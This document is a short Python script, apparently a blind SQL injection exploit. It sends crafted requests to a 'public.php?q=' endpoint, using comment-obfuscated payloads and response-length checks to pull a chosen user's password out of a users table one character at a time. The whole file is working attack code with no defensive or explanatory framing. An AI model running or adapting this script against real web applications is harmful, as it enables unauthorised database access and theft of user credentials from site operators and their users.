#
#

def vulnerablefunction_sqli(ip, inj_str):
    for j in range (32, 126):
        target = "http://%s/application/path/public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 254):
            return j
    return None

def inject(r, inj, ip):
    extracted = ""
    for i in range(1,r):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i)
        retrieved_value = vulnerablefunction_sqli(ip, injection_string)
        if(retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            break
    return extracted

def main():
    if len(sys.argv) != 3:
        sys.exit(-1)
    ip = sys.argv[1]
    username = sys.argv[2]
    query = 'select/**/password/**/from/**/users/**/where/**/login/**/=/**/\'%s\'' % (username)
    password = inject(50, query, ip)
